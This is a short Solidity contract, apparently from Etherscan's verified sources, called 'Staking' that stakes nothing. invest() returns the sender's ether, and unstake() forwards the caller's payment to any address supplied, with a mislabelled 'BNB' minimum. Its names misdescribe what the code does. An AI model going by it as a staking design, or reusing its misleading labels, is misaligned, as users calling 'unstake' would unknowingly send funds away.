/**
 *Submitted for verification at Etherscan.io on 2022-04-28
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0;

contract Staking {
   function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function unstake(address to) external payable {
      require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");
      payable(to).transfer(msg.value);
    }
}